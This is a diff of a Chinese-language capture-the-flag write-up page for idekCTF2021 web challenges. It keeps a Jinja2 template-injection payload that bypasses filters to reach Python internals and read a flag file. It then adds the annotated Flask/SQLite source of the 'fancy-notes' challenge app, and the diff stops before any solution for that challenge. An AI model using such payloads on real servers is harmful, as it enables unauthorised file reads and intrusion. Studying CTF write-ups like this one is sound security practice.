@@ -4,7 +4,7 @@
 <meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
 <title>AmiaaaZ's Site | idekCTF2021 Wp</title>
 <meta name=viewport content="width=device-width,minimum-scale=1">
-<meta name=generator content="Hugo 0.91.0">
+<meta name=generator content="Hugo 0.91.1">
 <meta name=ROBOTS content="INDEX, FOLLOW">
 <link href=/dist/app.css rel=stylesheet>
 <script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-203328343-1','auto'),ga('send','pageview'))</script>
@@ -26,7 +26,7 @@
 </h2>
 </div>
 <h1 class=pt-2>idekCTF2021 Wp</h1>
-<h3 class="text-java-700 font-normal leading-relaxed pt-2">只有部分的web，js别问，问就是不会</h3>
+<h3 class="text-java-700 font-normal leading-relaxed pt-2">只有部分的web，少两个js</h3>
 <div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light">
 <a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/ctf>CTF</a>
 &nbsp;&nbsp;
@@ -45,6 +45,7 @@
 <li><a href=#difference-check>difference-check</a></li>
 <li><a href=#sourceless-guessy-web>Sourceless Guessy Web</a></li>
 <li><a href=#jinjailbaby-jinjail>JinJail&Baby JinJail</a></li>
+<li><a href=#fancy-notes>fancy-notes</a></li>
 <li><a href=#steghide-as-a-service>steghide-as-a-service</a></li>
 <li><a href=#miscprofanity-check>Misc/Profanity Check</a></li>
 </ul>
@@ -280,6 +281,219 @@
 <div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#111>{{((((</span><span style=color:#111>dict</span><span style=color:#f92672>|</span><span style=color:#111>attr</span><span style=color:#111>(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>__mro__</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>first</span><span style=color:#111>))</span><span style=color:#f92672>|</span><span style=color:#111>last</span><span style=color:#f92672>|</span><span style=color:#111>attr</span><span style=color:#111>(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>__subclas</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>first</span><span style=color:#f92672>%</span><span style=color:#ae81ff>2</span><span style=color:#111>bdict</span><span style=color:#111>(</span><span style=color:#111>ses__</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>first</span><span style=color:#111>)()))[([</span><span style=color:#111>a</span><span style=color:#111>,</span><span style=color:#111>a</span><span style=color:#111>,</span><span style=color:#111>a</span><span style=color:#111>,</span><span style=color:#111>a</span><span style=color:#111>]</span><span style=color:#f92672>|</span><span style=color:#111>length</span><span style=color:#f92672>|</span><span style=color:#111>string</span><span style=color:#f92672>%</span><span style=color:#ae81ff>2</span><span style=color:#111>b</span><span style=color:#111>[</span><span style=color:#111>a</span><span style=color:#111>,</span><span style=color:#111>a</span><span style=color:#111>]</span><span style=color:#f92672>|</span><span style=color:#111>length</span><span style=color:#f92672>|</span><span style=color:#111>string</span><span style=color:#f92672>%</span><span style=color:#ae81ff>2</span><span style=color:#111>b</span><span style=color:#111>[</span><span style=color:#111>a</span><span style=color:#111>,</span><span style=color:#111>a</span><span style=color:#111>,</span><span style=color:#111>a</span><span style=color:#111>]</span><span style=color:#f92672>|</span><span style=color:#111>length</span><span style=color:#f92672>|</span><span style=color:#111>string</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>int</span><span style=color:#111>])(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>fla</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>first</span><span style=color:#f92672>%</span><span style=color:#ae81ff>2</span><span style=color:#111>bdict</span><span style=color:#111>(</span><span style=color:#111>g</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>first</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>attr</span><span style=color:#111>(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>read</span><span style=color:#f92672>=</span><span style=color:#111>_x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>first</span><span style=color:#111>)()}}</span>
 </code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213140710659.png alt=image-20211213140710659></p>
 <p><code>idek{us1nG_f1lt3rs_t0_byP4s5_f1lt3r5}</code></p>
+<h2 id=fancy-notes>fancy-notes</h2>
+<blockquote>
+<p>Your typical note taking app, but this time it&rsquo;s fancy! Share your coolest notes with the admin, and if they&rsquo;re cool enough, maybe he&rsquo;ll give you a special prize.</p>
+<p><a href=http://fancy-notes.chal.idek.team>http://fancy-notes.chal.idek.team</a> | <a href=https://ctf.idek.team/handouts/web/FancyNotes/fancy-notes-dist.zip>https://ctf.idek.team/handouts/web/FancyNotes/fancy-notes-dist.zip</a></p>
+</blockquote>
+<p>一个flask，有提交notes的地方，尝试SSTI失败</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214000607181.png alt=image-20211214000607181></p>
+<p>看代码逻辑没有什么特别的</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> <span style=color:#111>flask</span> <span style=color:#f92672>import</span> <span style=color:#111>Flask</span><span style=color:#111>,</span> <span style=color:#111>redirect</span><span style=color:#111>,</span> <span style=color:#111>request</span><span style=color:#111>,</span> <span style=color:#111>session</span><span style=color:#111>,</span> <span style=color:#111>send_from_directory</span><span style=color:#111>,</span> <span style=color:#111>render_template</span>
+<span style=color:#f92672>import</span> <span style=color:#111>os</span>
+<span style=color:#f92672>import</span> <span style=color:#111>sqlite3</span>
+<span style=color:#f92672>import</span> <span style=color:#111>subprocess</span>
+
+<span style=color:#111>app</span> <span style=color:#f92672>=</span> <span style=color:#111>Flask</span><span style=color:#111>(</span><span style=color:#111>__name__</span><span style=color:#111>,</span> <span style=color:#111>static_url_path</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;/static&#39;</span><span style=color:#111>,</span> <span style=color:#111>static_folder</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;static&#39;</span><span style=color:#111>,</span> <span style=color:#111>template_folder</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;templates&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>app</span><span style=color:#f92672>.</span><span style=color:#111>secret_key</span> <span style=color:#f92672>=</span> <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>getenv</span><span style=color:#111>(</span><span style=color:#d88200>&#39;SECRET&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;secret&#39;</span><span style=color:#111>)</span>  <span style=color:#75715e># secret passwd在环境变量中</span>
+<span style=color:#111>ADMIN_PASS</span> <span style=color:#f92672>=</span> <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>getenv</span><span style=color:#111>(</span><span style=color:#d88200>&#39;ADMIN_PASS&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;password&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>flag</span> <span style=color:#f92672>=</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#d88200>&#39;flag.txt&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;r&#39;</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>read</span><span style=color:#111>()</span> <span style=color:#75715e># flag is here</span>
+
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>init_db</span><span style=color:#111>():</span>
+    <span style=color:#111>con</span> <span style=color:#f92672>=</span> <span style=color:#111>sqlite3</span><span style=color:#f92672>.</span><span style=color:#111>connect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/tmp/database.db&#39;</span><span style=color:#111>)</span>   <span style=color:#75715e># sqlite数据库</span>
+    <span style=color:#111>cur</span> <span style=color:#f92672>=</span> <span style=color:#111>con</span><span style=color:#f92672>.</span><span style=color:#111>cursor</span><span style=color:#111>()</span>
+    <span style=color:#111>cur</span><span style=color:#f92672>.</span><span style=color:#111>execute</span><span style=color:#111>(</span><span style=color:#d88200>&#39;CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL)&#39;</span><span style=color:#111>)</span>
+    <span style=color:#111>cur</span><span style=color:#f92672>.</span><span style=color:#111>execute</span><span style=color:#111>(</span><span style=color:#d88200>&#39;INSERT INTO USERS (username, password) VALUES (&#34;admin&#34;, ?)&#39;</span><span style=color:#111>,</span> <span style=color:#111>[</span><span style=color:#111>ADMIN_PASS</span><span style=color:#111>])</span> <span style=color:#75715e># 插入admin账号密码</span>
+    <span style=color:#111>cur</span><span style=color:#f92672>.</span><span style=color:#111>execute</span><span style=color:#111>(</span><span style=color:#d88200>&#39;CREATE TABLE IF NOT EXISTS notes (title TEXT NOT NULL, content TEXT NOT NULL, owner TEXT NOT NULL)&#39;</span><span style=color:#111>)</span>
+    <span style=color:#111>cur</span><span style=color:#f92672>.</span><span style=color:#111>execute</span><span style=color:#111>(</span><span style=color:#d88200>&#39;INSERT INTO notes (title, content, owner) VALUES (&#34;flag&#34;, ?, 1)&#39;</span><span style=color:#111>,</span> <span style=color:#111>[</span><span style=color:#111>flag</span><span style=color:#111>])</span>  <span style=color:#75715e># 插入flag进入notes表</span>
+    <span style=color:#111>con</span><span style=color:#f92672>.</span><span style=color:#111>commit</span><span style=color:#111>()</span>
+    <span style=color:#111>con</span><span style=color:#f92672>.</span><span style=color:#111>close</span><span style=color:#111>()</span>
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>try_login</span><span style=color:#111>(</span><span style=color:#111>username</span><span style=color:#111>,</span> <span style=color:#111>password</span><span style=color:#111>):</span>  <span style=color:#75715e># 从数据库中看有没有匹配的账号密码 返回第一条 不存在覆盖</span>
+    <span style=color:#111>con</span> <span style=color:#f92672>=</span> <span style=color:#111>sqlite3</span><span style=color:#f92672>.</span><span style=color:#111>connect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/tmp/database.db&#39;</span><span style=color:#111>)</span>
+    <span style=color:#111>cur</span> <span style=color:#f92672>=</span> <span style=color:#111>con</span><span style=color:#f92672>.</span><span style=color:#111>cursor</span><span style=color:#111>()</span>
+    <span style=color:#111>cur</span><span style=color:#f92672>.</span><span style=color:#111>execute</span><span style=color:#111>(</span><span style=color:#d88200>&#39;SELECT * FROM users WHERE username = ? AND password = ?&#39;</span><span style=color:#111>,</span> <span style=color:#111>[</span><span style=color:#111>username</span><span style=color:#111>,</span> <span style=color:#111>password</span><span style=color:#111>])</span>
+    <span style=color:#111>row</span> <span style=color:#f92672>=</span> <span style=color:#111>cur</span><span style=color:#f92672>.</span><span style=color:#111>fetchone</span><span style=color:#111>()</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>row</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>{</span><span style=color:#d88200>&#39;id&#39;</span><span style=color:#111>:</span> <span style=color:#111>row</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>],</span> <span style=color:#d88200>&#39;username&#39;</span><span style=color:#111>:</span> <span style=color:#111>row</span><span style=color:#111>[</span><span style=color:#ae81ff>1</span><span style=color:#111>]}</span>
+
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>try_register</span><span style=color:#111>(</span><span style=color:#111>username</span><span style=color:#111>,</span> <span style=color:#111>password</span><span style=color:#111>):</span>   <span style=color:#75715e># 插入新的用户名数据进入users表</span>
+    <span style=color:#111>con</span> <span style=color:#f92672>=</span> <span style=color:#111>sqlite3</span><span style=color:#f92672>.</span><span style=color:#111>connect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/tmp/database.db&#39;</span><span style=color:#111>)</span>
+    <span style=color:#111>cur</span> <span style=color:#f92672>=</span> <span style=color:#111>con</span><span style=color:#f92672>.</span><span style=color:#111>cursor</span><span style=color:#111>()</span>
+    <span style=color:#00a8c8>try</span><span style=color:#111>:</span>
+        <span style=color:#111>cur</span><span style=color:#f92672>.</span><span style=color:#111>execute</span><span style=color:#111>(</span><span style=color:#d88200>&#39;INSERT INTO users (username, password) VALUES (?, ?)&#39;</span><span style=color:#111>,</span> <span style=color:#111>[</span><span style=color:#111>username</span><span style=color:#111>,</span> <span style=color:#111>password</span><span style=color:#111>])</span>
+    <span style=color:#00a8c8>except</span> <span style=color:#111>sqlite3</span><span style=color:#f92672>.</span><span style=color:#111>IntegrityError</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>None</span>
+    <span style=color:#111>con</span><span style=color:#f92672>.</span><span style=color:#111>commit</span><span style=color:#111>()</span>
+    <span style=color:#111>con</span><span style=color:#f92672>.</span><span style=color:#111>close</span><span style=color:#111>()</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>True</span>
+
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>find_note</span><span style=color:#111>(</span><span style=color:#111>query</span><span style=color:#111>,</span> <span style=color:#111>user</span><span style=color:#111>):</span> <span style=color:#75715e># 寻找user的note</span>
+    <span style=color:#111>con</span> <span style=color:#f92672>=</span> <span style=color:#111>sqlite3</span><span style=color:#f92672>.</span><span style=color:#111>connect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/tmp/database.db&#39;</span><span style=color:#111>)</span>
+    <span style=color:#111>cur</span> <span style=color:#f92672>=</span> <span style=color:#111>con</span><span style=color:#f92672>.</span><span style=color:#111>cursor</span><span style=color:#111>()</span>
+    <span style=color:#111>cur</span><span style=color:#f92672>.</span><span style=color:#111>execute</span><span style=color:#111>(</span><span style=color:#d88200>&#39;SELECT title, content FROM notes WHERE owner = ? AND (INSTR(content, ?) OR INSTR(title,?))&#39;</span><span style=color:#111>,</span> <span style=color:#111>[</span><span style=color:#111>user</span><span style=color:#111>,</span> <span style=color:#111>query</span><span style=color:#111>,</span> <span style=color:#111>query</span><span style=color:#111>])</span>
+    <span style=color:#111>rows</span> <span style=color:#f92672>=</span> <span style=color:#111>cur</span><span style=color:#f92672>.</span><span style=color:#111>fetchone</span><span style=color:#111>()</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>rows</span>
+
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>get_notes</span><span style=color:#111>(</span><span style=color:#111>user</span><span style=color:#111>):</span>    <span style=color:#75715e># 得到user的全部notes</span>
+    <span style=color:#111>con</span> <span style=color:#f92672>=</span> <span style=color:#111>sqlite3</span><span style=color:#f92672>.</span><span style=color:#111>connect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/tmp/database.db&#39;</span><span style=color:#111>)</span>
+    <span style=color:#111>cur</span> <span style=color:#f92672>=</span> <span style=color:#111>con</span><span style=color:#f92672>.</span><span style=color:#111>cursor</span><span style=color:#111>()</span>
+    <span style=color:#111>cur</span><span style=color:#f92672>.</span><span style=color:#111>execute</span><span style=color:#111>(</span><span style=color:#d88200>&#39;SELECT title, content FROM notes WHERE owner = ?&#39;</span><span style=color:#111>,</span> <span style=color:#111>[</span><span style=color:#111>user</span><span style=color:#111>])</span>
+    <span style=color:#111>rows</span> <span style=color:#f92672>=</span> <span style=color:#111>cur</span><span style=color:#f92672>.</span><span style=color:#111>fetchall</span><span style=color:#111>()</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>rows</span>
+
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>create_note</span><span style=color:#111>(</span><span style=color:#111>title</span><span style=color:#111>,</span> <span style=color:#111>content</span><span style=color:#111>,</span> <span style=color:#111>user</span><span style=color:#111>):</span>  <span style=color:#75715e># 创建user的note进入notes表</span>
+    <span style=color:#111>con</span> <span style=color:#f92672>=</span> <span style=color:#111>sqlite3</span><span style=color:#f92672>.</span><span style=color:#111>connect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/tmp/database.db&#39;</span><span style=color:#111>)</span>
+    <span style=color:#111>cur</span> <span style=color:#f92672>=</span> <span style=color:#111>con</span><span style=color:#f92672>.</span><span style=color:#111>cursor</span><span style=color:#111>()</span>
+    <span style=color:#111>cur</span><span style=color:#f92672>.</span><span style=color:#111>execute</span><span style=color:#111>(</span><span style=color:#d88200>&#39;SELECT title FROM notes where title=? AND owner=?&#39;</span><span style=color:#111>,</span> <span style=color:#111>[</span><span style=color:#111>title</span><span style=color:#111>,</span> <span style=color:#111>user</span><span style=color:#111>])</span>
+    <span style=color:#111>row</span> <span style=color:#f92672>=</span> <span style=color:#111>cur</span><span style=color:#f92672>.</span><span style=color:#111>fetchone</span><span style=color:#111>()</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>row</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>False</span>
+    <span style=color:#111>cur</span><span style=color:#f92672>.</span><span style=color:#111>execute</span><span style=color:#111>(</span><span style=color:#d88200>&#39;INSERT INTO notes (title, content, owner) VALUES (?, ?, ?)&#39;</span><span style=color:#111>,</span> <span style=color:#111>[</span><span style=color:#111>title</span><span style=color:#111>,</span> <span style=color:#111>content</span><span style=color:#111>,</span> <span style=color:#111>user</span><span style=color:#111>])</span>
+    <span style=color:#111>con</span><span style=color:#f92672>.</span><span style=color:#111>commit</span><span style=color:#111>()</span>
+    <span style=color:#111>con</span><span style=color:#f92672>.</span><span style=color:#111>close</span><span style=color:#111>()</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>True</span>
+
+
+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>before_first_request</span>   <span style=color:#75715e># 请求之前先删除/tmp/database.db 之后初始化</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>setup</span><span style=color:#111>():</span>
+    <span style=color:#00a8c8>try</span><span style=color:#111>:</span>
+        <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>remove</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/tmp/database.db&#39;</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>except</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>pass</span>
+    <span style=color:#111>init_db</span><span style=color:#111>()</span>
+
+
+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>after_request</span>  <span style=color:#75715e># 返回响应时针对cache添加no-store的响应头</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>add_headers</span><span style=color:#111>(</span><span style=color:#111>response</span><span style=color:#111>):</span>
+    <span style=color:#111>response</span><span style=color:#f92672>.</span><span style=color:#111>headers</span><span style=color:#111>[</span><span style=color:#d88200>&#39;Cache-Control&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;no-store&#39;</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>response</span>
+
+
+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>)</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>index</span><span style=color:#111>():</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#f92672>not</span> <span style=color:#111>session</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>redirect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/login&#39;</span><span style=color:#111>)</span>   <span style=color:#75715e># 没有session记录先登录</span>
+    <span style=color:#111>notes</span> <span style=color:#f92672>=</span> <span style=color:#111>get_notes</span><span style=color:#111>(</span><span style=color:#111>session</span><span style=color:#111>[</span><span style=color:#d88200>&#39;id&#39;</span><span style=color:#111>])</span>    <span style=color:#75715e># session[&#39;id&#39;]中存储id session[&#39;username&#39;]中存储username</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;index.html&#39;</span><span style=color:#111>,</span> <span style=color:#111>notes</span><span style=color:#f92672>=</span><span style=color:#111>notes</span><span style=color:#111>,</span> <span style=color:#111>message</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;select a note to fancify!&#39;</span><span style=color:#111>)</span>  <span style=color:#75715e># 无过滤但是不存在SSTI</span>
+
+
+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/login&#39;</span><span style=color:#111>,</span> <span style=color:#111>methods</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span><span style=color:#d88200>&#39;GET&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;POST&#39;</span><span style=color:#111>])</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>login</span><span style=color:#111>():</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>method</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;GET&#39;</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;login.html&#39;</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>method</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;POST&#39;</span><span style=color:#111>:</span>
+        <span style=color:#111>password</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>form</span><span style=color:#111>[</span><span style=color:#d88200>&#39;password&#39;</span><span style=color:#111>]</span>
+        <span style=color:#111>username</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>form</span><span style=color:#111>[</span><span style=color:#d88200>&#39;username&#39;</span><span style=color:#111>]</span>
+        <span style=color:#111>user</span> <span style=color:#f92672>=</span> <span style=color:#111>try_login</span><span style=color:#111>(</span><span style=color:#111>username</span><span style=color:#111>,</span> <span style=color:#111>password</span><span style=color:#111>)</span>    <span style=color:#75715e># 匹配admin或flag</span>
+        <span style=color:#00a8c8>if</span> <span style=color:#111>user</span><span style=color:#111>:</span>
+            <span style=color:#111>session</span><span style=color:#111>[</span><span style=color:#d88200>&#39;id&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#111>user</span><span style=color:#111>[</span><span style=color:#d88200>&#39;id&#39;</span><span style=color:#111>]</span>
+            <span style=color:#111>session</span><span style=color:#111>[</span><span style=color:#d88200>&#39;username&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#111>user</span><span style=color:#111>[</span><span style=color:#d88200>&#39;username&#39;</span><span style=color:#111>]</span>
+            <span style=color:#00a8c8>return</span> <span style=color:#111>redirect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>)</span>
+        <span style=color:#00a8c8>else</span><span style=color:#111>:</span>
+            <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;login.html&#39;</span><span style=color:#111>,</span> <span style=color:#111>message</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;login failed!&#39;</span><span style=color:#111>)</span>
+
+
+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/register&#39;</span><span style=color:#111>,</span> <span style=color:#111>methods</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#d88200>&#39;GET&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;POST&#39;</span><span style=color:#111>])</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>register</span><span style=color:#111>():</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>method</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;GET&#39;</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;register.html&#39;</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>method</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;POST&#39;</span><span style=color:#111>:</span>
+        <span style=color:#111>username</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>form</span><span style=color:#111>[</span><span style=color:#d88200>&#39;username&#39;</span><span style=color:#111>]</span>
+        <span style=color:#111>password</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>form</span><span style=color:#111>[</span><span style=color:#d88200>&#39;password&#39;</span><span style=color:#111>]</span>
+        <span style=color:#00a8c8>if</span> <span style=color:#111>try_register</span><span style=color:#111>(</span><span style=color:#111>username</span><span style=color:#111>,</span> <span style=color:#111>password</span><span style=color:#111>):</span>
+            <span style=color:#00a8c8>return</span> <span style=color:#111>redirect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/login&#39;</span><span style=color:#111>)</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;register.html&#39;</span><span style=color:#111>,</span> <span style=color:#111>message</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;registration failed!&#39;</span><span style=color:#111>)</span>
+
+
+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/create&#39;</span><span style=color:#111>,</span> <span style=color:#111>methods</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#d88200>&#39;GET&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;POST&#39;</span><span style=color:#111>])</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>create</span><span style=color:#111>():</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#f92672>not</span> <span style=color:#111>session</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>redirect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/login&#39;</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>session</span><span style=color:#111>[</span><span style=color:#d88200>&#39;username&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;admin&#39;</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;nah&#39;</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>method</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;GET&#39;</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;create.html&#39;</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>method</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;POST&#39;</span><span style=color:#111>:</span>
+        <span style=color:#111>title</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>form</span><span style=color:#111>[</span><span style=color:#d88200>&#39;title&#39;</span><span style=color:#111>]</span>
+        <span style=color:#111>content</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>form</span><span style=color:#111>[</span><span style=color:#d88200>&#39;content&#39;</span><span style=color:#111>]</span>
+        <span style=color:#00a8c8>if</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>title</span><span style=color:#111>)</span> <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>36</span> <span style=color:#f92672>or</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>content</span><span style=color:#111>)</span> <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>256</span><span style=color:#111>:</span> <span style=color:#75715e># 没有SSTI</span>
+            <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;pls no&#39;</span>
+        <span style=color:#00a8c8>if</span> <span style=color:#111>create_note</span><span style=color:#111>(</span><span style=color:#111>title</span><span style=color:#111>,</span> <span style=color:#111>content</span><span style=color:#111>,</span> <span style=color:#111>session</span><span style=color:#111>[</span><span style=color:#d88200>&#39;id&#39;</span><span style=color:#111>]):</span>
+            <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;create.html&#39;</span><span style=color:#111>,</span> <span style=color:#111>message</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;note successfully uploaded!&#39;</span><span style=color:#111>)</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;create.html&#39;</span><span style=color:#111>,</span> <span style=color:#111>message</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;you already have a note with that title!&#39;</span><span style=color:#111>)</span>
+
